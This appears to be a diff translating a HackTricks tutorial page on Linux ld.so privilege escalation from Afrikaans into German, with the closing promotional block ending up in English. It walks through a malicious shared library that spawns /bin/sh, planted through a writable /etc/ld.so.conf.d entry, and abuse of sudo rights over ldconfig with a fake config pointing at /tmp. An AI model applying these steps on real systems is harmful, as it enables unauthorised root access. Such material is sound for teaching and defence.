@@ -1,16 +1,16 @@
-# ld.so privesc exploit voorbeeld
+# ld.so privesc exploit Beispiel
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -22,10 +22,11 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 {% endhint %}
 {% endhint %}
 {% endhint %}
+{% endhint %}
 
-## Berei die omgewing voor
+## Bereite die Umgebung vor
 
-In die volgende afdeling kan jy die kode van die lêers vind wat ons gaan gebruik om die omgewing voor te berei
+Im folgenden Abschnitt findest du den Code der Dateien, die wir verwenden werden, um die Umgebung vorzubereiten
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -61,14 +62,14 @@ puts("Hi");
 {% endtab %}
 {% endtabs %}
 
-1. **Skep** daardie lêers op jou masjien in dieselfde gids
-2. **Kompileer** die **biblioteek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Kopieer** `libcustom.so` na `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Kompileer** die **uitvoerbare**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Erstellen** Sie diese Dateien auf Ihrem Rechner im selben Ordner
+2. **Kompilieren** Sie die **Bibliothek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Kopieren** Sie `libcustom.so` nach `/usr/lib`: `sudo cp libcustom.so /usr/lib` (Root-Rechte)
+4. **Kompilieren** Sie die **ausführbare Datei**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### Kontroleer die omgewing
+### Überprüfen Sie die Umgebung
 
-Kontroleer dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre kan **uitvoer**.
+Überprüfen Sie, dass _libcustom.so_ von _/usr/lib_ **geladen** wird und dass Sie die Binärdatei **ausführen** können.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -82,12 +83,12 @@ Hi
 ```
 ## Exploit
 
-In hierdie scenario gaan ons veronderstel dat **iemand 'n kwesbare invoer geskep het** binne 'n lêer in _/etc/ld.so.conf/_:
+In diesem Szenario nehmen wir an, dass **jemand einen verwundbaren Eintrag** in einer Datei in _/etc/ld.so.conf/_ erstellt hat:
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-Die kwesbare gids is _/home/ubuntu/lib_ (waar ons skrywe toegang het).\
-**Laai en kompileer** die volgende kode binne daardie pad:
+Der verwundbare Ordner ist _/home/ubuntu/lib_ (wo wir schreibbaren Zugriff haben).\
+**Laden Sie den folgenden Code herunter und kompilieren Sie ihn** in diesem Pfad:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -102,9 +103,9 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Nou dat ons die **kwaadwillige libcustom biblioteek binne die verkeerd geconfigureerde** pad geskep het, moet ons wag vir 'n **herlaai** of vir die root gebruiker om **`ldconfig`** uit te voer (_in die geval dat jy hierdie binaire as **sudo** kan uitvoer of dit die **suid bit** het, sal jy dit self kan uitvoer_).
+Jetzt, da wir die **bösartige libcustom-Bibliothek im falsch konfigurierten** Pfad **erstellt haben**, müssen wir auf einen **Neustart** oder darauf warten, dass der Root-Benutzer **`ldconfig`** ausführt (_falls Sie diese Binärdatei als **sudo** ausführen können oder das **suid-Bit** gesetzt ist, können Sie sie selbst ausführen_).
 
-Sodra dit gebeur het, **herkontroleer** waar die `sharevuln` uitvoerbare lêer die `libcustom.so` biblioteek laai vanaf:
+Sobald dies geschehen ist, **überprüfen** Sie erneut, wo das `sharevuln`-Executable die `libcustom.so`-Bibliothek lädt:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -112,7 +113,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Soos jy kan sien, **laai dit dit vanaf `/home/ubuntu/lib`** en as enige gebruiker dit uitvoer, sal 'n shell uitgevoer word:
+Wie Sie sehen können, wird es **von `/home/ubuntu/lib` geladen** und wenn ein Benutzer es ausführt, wird eine Shell ausgeführt:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -121,26 +122,26 @@ $ whoami
 ubuntu
 ```
 {% hint style="info" %}
-Let daarop dat ons in hierdie voorbeeld nie privilige verhoog het nie, maar deur die opdragte wat uitgevoer word te verander en **te wag vir root of 'n ander bevoorregte gebruiker om die kwesbare binêre uit te voer** sal ons in staat wees om privilige te verhoog.
+Beachten Sie, dass wir in diesem Beispiel keine Berechtigungen erhöht haben, aber durch das Modifizieren der ausgeführten Befehle und **Warten auf den Root- oder einen anderen privilegierten Benutzer, der die verwundbare Binärdatei ausführt**, werden wir in der Lage sein, die Berechtigungen zu erhöhen.
 {% endhint %}
 
-### Ander miskonfigurasies - Dieselfde kwesbaarheid
+### Andere Fehlkonfigurationen - Dieselbe Verwundbarkeit
 
-In die vorige voorbeeld het ons 'n miskonfigurasie gefak waar 'n administrateur **'n nie-bevoorregte gids binne 'n konfigurasie-lêer binne `/etc/ld.so.conf.d/`** gestel het.\
-Maar daar is ander miskonfigurasies wat dieselfde kwesbaarheid kan veroorsaak, as jy **skryfregte** in 'n **konfigurasie-lêer** binne `/etc/ld.so.conf.d`, in die gids `/etc/ld.so.conf.d` of in die lêer `/etc/ld.so.conf` het, kan jy dieselfde kwesbaarheid konfigureer en dit benut.
+Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator **einen nicht privilegierten Ordner in einer Konfigurationsdatei in `/etc/ld.so.conf.d/`** festgelegt hat.\
+Es gibt jedoch andere Fehlkonfigurationen, die dieselbe Verwundbarkeit verursachen können. Wenn Sie **Schreibberechtigungen** in einer **Konfigurationsdatei** innerhalb von `/etc/ld.so.conf.d`, im Ordner `/etc/ld.so.conf.d` oder in der Datei `/etc/ld.so.conf` haben, können Sie dieselbe Verwundbarkeit konfigurieren und ausnutzen.
 
 ## Exploit 2
 
-**Neem aan jy het sudo privilige oor `ldconfig`**.\
-Jy kan aan dui `ldconfig` **waar om die konfigurasie-lêers van te laai**, so ons kan dit benut om `ldconfig` te laat laai willekeurige gidse.\
-So, kom ons skep die lêers en gidse wat nodig is om "/tmp" te laai:
+**Angenommen, Sie haben sudo-Berechtigungen für `ldconfig`**.\
+Sie können `ldconfig` **angeben, wo die Konfigurationsdateien geladen werden sollen**, sodass wir dies ausnutzen können, um `ldconfig` anzuweisen, beliebige Ordner zu laden.\
+Lassen Sie uns also die benötigten Dateien und Ordner erstellen, um "/tmp" zu laden:
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Nou, soos aangedui in die **vorige uitbuiting**, **skep die kwaadwillige biblioteek binne `/tmp`**.\
-En laastens, laat ons die pad laai en kyk waar die binêre die biblioteek van laai:
+Jetzt, wie im **vorherigen Exploit** angegeben, **erstellen Sie die bösartige Bibliothek im Verzeichnis `/tmp`**.\
+Und schließlich laden wir den Pfad und überprüfen, wo die Binärdatei die Bibliothek lädt:
 ```bash
 ldconfig -f fake.ld.so.conf
 
@@ -150,20 +151,20 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Soos jy kan sien, as jy sudo-regte oor `ldconfig` het, kan jy dieselfde kwesbaarheid benut.**
+**Wie Sie sehen können, können Sie mit sudo-Rechten über `ldconfig` dieselbe Schwachstelle ausnutzen.**
 
 {% hint style="info" %}
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
